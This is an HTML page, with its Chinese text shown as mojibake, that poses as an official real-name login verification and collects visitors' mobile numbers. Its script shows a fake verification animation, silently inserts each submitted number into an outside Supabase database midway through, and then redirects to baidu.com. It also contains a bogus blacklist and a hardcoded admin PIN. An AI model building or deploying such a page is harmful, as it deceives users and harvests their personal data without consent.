<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>æ¬¢è¿ç™»å½•ç¥ç§˜ç½‘</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root { --gold: #c6a35f; --bg: #0a0a0a; }
        body { font-family: -apple-system, sans-serif; background: var(--bg); color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .box { width: 85%; max-width: 320px; text-align: center; border: 1px solid #222; padding: 30px 20px; border-radius: 20px; background: #111; }
        .radar { width: 60px; height: 60px; border: 2px solid var(--gold); border-radius: 50%; margin: 0 auto 20px; display: flex; justify-content: center; align-items: center; position: relative; }
        .radar::after { content: ""; width: 100%; height: 100%; border: 2px solid var(--gold); border-radius: 50%; position: absolute; animation: p 2s infinite; opacity: 0; }
        @keyframes p { 0% { transform: scale(1); opacity: 0.5; } 100% { transform: scale(1.6); opacity: 0; } }
        h2 { font-size: 19px; letter-spacing: 1px; margin-bottom: 10px; }
        p { font-size: 12px; color: #666; line-height: 1.6; margin-bottom: 25px; }
        .input-group { background: #1a1a1a; border: 1px solid #333; border-radius: 12px; margin-bottom: 20px; }
        input { width: 100%; background: transparent; border: none; padding: 15px 0; color: #fff; font-size: 18px; outline: none; text-align: center; }
        .btn { width: 100%; padding: 16px; background: var(--gold); color: #000; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
        #log { font-size: 10px; color: var(--gold); margin-top: 15px; font-family: monospace; min-height: 14px; }
        .dot { margin-top: 50px; color: #111; cursor: pointer; }
    </style>
</head>
<body>

<div class="box">
    <div id="ui-main">
        <div class="radar">ğŸ“¡</div>
        <h2>å®åç™»å½•æ ¸éªŒ</h2>
        <p>ç³»ç»Ÿå°†è‡ªåŠ¨æ¯”å¯¹è®¾å¤‡ç‰¹å¾ä¸å®åæ•°æ®åº“ã€‚è¯·ç¡®ä¿å¡«å†™çš„æ‰‹æœºå·ä¸ºæ‚¨æœ¬äººçš„å®åå·ç ã€‚</p>
        <div class="input-group">
            <input type="tel" id="u-phone" placeholder="è¾“å…¥11ä½æ‰‹æœºå·" maxlength="11">
        </div>
        <button class="btn" id="btn-run" onclick="verify()">ç«‹å³æ ¸éªŒ</button>
        <div id="log"></div>
    </div>
    <div class="dot" onclick="clickDot()">.</div>
</div>

<script>
    // é…ç½®
    const MY_URL = 'https://wzowdkjzitwjmacirofy.supabase.co'; 
    const MY_KEY = 'sb_publishable_vUkpj6iL4DNNwSH3S7w6xQ_qifNETLn';
    const REDIRECT_URL = 'https://www.baidu.com'; 

    let client = window.supabase.createClient(MY_URL, MY_KEY);
    let startTime = new Date();

    async function verify() {
        const phone = document.getElementById('u-phone').value;
        const log = document.getElementById('log');
        const btn = document.getElementById('btn-run');

        // 1. ç²¾å‡†å·æ®µç™½åå• (ç™½åå•æ‹¦æˆªæ¯”é»‘åå•æ›´ç²¾ç¡®)
        // æ¶µç›–ç§»åŠ¨ã€è”é€šã€ç”µä¿¡ã€å¹¿ç”µæ‰€æœ‰å®˜æ–¹åˆæ³•å·æ®µ
        const proRegex = /^(?:(?:\+|00)86)?1(?:3[\d]|4[5-9]|5[0-3,5-9]|6[2567]|7[0-8]|8[\d]|9[0-3,5-9])\d{8}$/;
        
        // ç‰¹æ®Šé»‘åå•ï¼ˆé’ˆå¯¹ä¹±å¡«é«˜æ‰‹ï¼‰
        const spyList = ["18601654433", "13800138000", "12345678901"];

        if (!proRegex.test(phone)) {
            alert("âš ï¸ æ¥å…¥å¤±è´¥ï¼šæœªæ£€æµ‹åˆ°åˆæ³•çš„ä¸­å›½è¿è¥å•†å®åå·æ®µ");
            return;
        }

        if (spyList.includes(phone)) {
            alert("âš ï¸ å®‰å…¨è­¦å‘Šï¼šè¯¥å·ç å› å¤šæ¬¡å¼‚å¸¸æäº¤å·²è¢«åˆ—å…¥é£æ§é»‘åå•");
            return;
        }

        // 2. è¡Œä¸ºæ ¡éªŒï¼ˆé˜²æ­¢ç§’å¡«ï¼‰
        if ((new Date() - startTime) < 3000) {
            alert("âš ï¸ æ“ä½œè¿‡å¿«ï¼šç³»ç»Ÿæ­£åœ¨åˆå§‹åŒ–å®‰å…¨é“¾è·¯ï¼Œè¯·ç¨å");
            return;
        }

        // 3. æ¨¡æ‹Ÿæ ¸éªŒåŠ¨ç”»
        btn.disabled = true;
        const steps = ["è¿æ¥ç§»åŠ¨ç½‘å…³...", "æ£€ç´¢å·æ®µå½’å±åœ°...", "åŒ¹é…å®åç‰¹å¾...", "é€šè¿‡æ ¸éªŒï¼Œæ­£åœ¨è·³è½¬..."];
        
        for (let i = 0; i < steps.length; i++) {
            log.innerText = steps[i];
            await new Promise(r => setTimeout(r, 800));
            if (i === 1) {
                // åœ¨ä¸­é—´æ­¥éª¤æ‚„æ‚„æäº¤åˆ° Supabase
                await client.from('logins').insert([{ phone: phone }]);
            }
        }
        
        window.location.href = REDIRECT_URL;
    }

    let taps = 0;
    function clickDot() {
        if (++taps >= 5) {
            const p = prompt("PIN:");
            if (p === "123456") alert("ç®¡ç†å‘˜æ¨¡å¼å·²æ¿€æ´»");
        }
    }
</script>
</body>
</html>